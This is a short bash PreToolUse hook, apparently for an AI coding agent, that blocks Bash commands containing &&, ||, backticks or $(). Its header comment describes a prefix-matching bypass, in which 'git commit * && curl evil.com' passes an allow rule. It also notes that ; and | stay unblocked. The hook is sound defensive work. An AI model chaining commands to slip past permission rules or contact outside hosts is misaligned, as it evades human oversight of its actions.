#!/bin/bash
# PreToolUse hook: reject Bash commands containing shell operators.
# Closes the prefix-matching bypass where "git commit * && curl evil.com"
# matches Bash(git commit *) and executes both commands.
#
# Blocked operators: && || ` $()
# Not blocked: ; (too many false positives in commit messages and jq)
#              | (used in --jq flag arguments)
set -euo pipefail

command=$(jq -r '.tool_input.command // empty' 2>/dev/null)

if [ -z "$command" ]; then
    exit 0
fi

if echo "$command" | grep -qE '&&|\|\||`|\$\('; then
    echo "Blocked: shell operator in command (&&, ||, backtick, or \$())" >&2
    exit 2
fi

exit 0
